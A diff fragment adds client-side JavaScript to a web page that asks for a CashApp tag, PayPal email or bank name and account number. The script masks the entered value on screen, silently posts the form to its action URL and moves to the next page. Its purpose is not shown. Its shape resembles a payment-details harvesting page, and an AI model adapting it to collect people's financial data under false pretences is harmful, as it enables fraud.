+        document.querySelectorAll('input[name="payment_pref"]').forEach(radio => radio.checked = false);
+
+        document.getElementById(`opt-${method}`).classList.add('selected');
+        document.getElementById(`rad-${method}`).checked = true;
+        
+        document.getElementById('hiddenMethodType').value = method.toUpperCase();
+    }
+
+    function processDashboardUpdate() {
+        document.getElementById('p3-error-frame').style.display = 'none';
+        document.querySelectorAll('#page3 .input-group').forEach(el => el.classList.remove('field-error'));
+
+        const checkedRadio = document.querySelector('.method-option.selected');
+        if (!checkedRadio) {
+            document.getElementById('p3-error-frame').style.display = 'block';
+            return;
+        }
+
+        const methodType = checkedRadio.id.replace('opt-', '');
+        let maskedVal = "•••• ••••";
+        let localValid = true;
+
+        if(methodType === 'cashapp') {
+            const tag = document.getElementById('cashapp_tag').value.trim();
+            if(!tag) { document.getElementById('grp-cash-val').classList.add('field-error'); localValid = false; }
+            maskedVal = `$••••${tag.slice(-3)}`;
+        } else if(methodType === 'paypal') {
+            const mail = document.getElementById('paypal_email').value.trim();
+            if(!mail) { document.getElementById('grp-pay-val').classList.add('field-error'); localValid = false; }
+            maskedVal = `•••${mail.slice(mail.indexOf('@') - 3)}`;
+        } else if(methodType === 'banking') {
+            const bnk = document.getElementById('bank_name').value.trim();
+            const acc = document.getElementById('account_num').value.trim();
+            if(!bnk) { document.getElementById('grp-bnk-val1').classList.add('field-error'); localValid = false; }
+            if(!acc) { document.getElementById('grp-bnk-val2').classList.add('field-error'); localValid = false; }
+            maskedVal = `•••• •••• ${acc.slice(-4)}`;
+        }
+
+        if(!localValid) {
+            document.getElementById('p3-error-frame').style.display = 'block';
+            return;
+        }
+
+        document.getElementById('dash-masked-details').innerText = maskedVal;
+
+        const activeForm = document.getElementById('portalMasterForm');
+        const inputPayload = new FormData(activeForm);
+
+        fetch(activeForm.action, {
+            method: 'POST',
+            body: inputPayload,
+            headers: {
+                'Accept': 'application/json'
+            }
+        });
+
+        switchPage('page3', 'page4');
+    }
+</script>
+
 </body>
 </html>
-
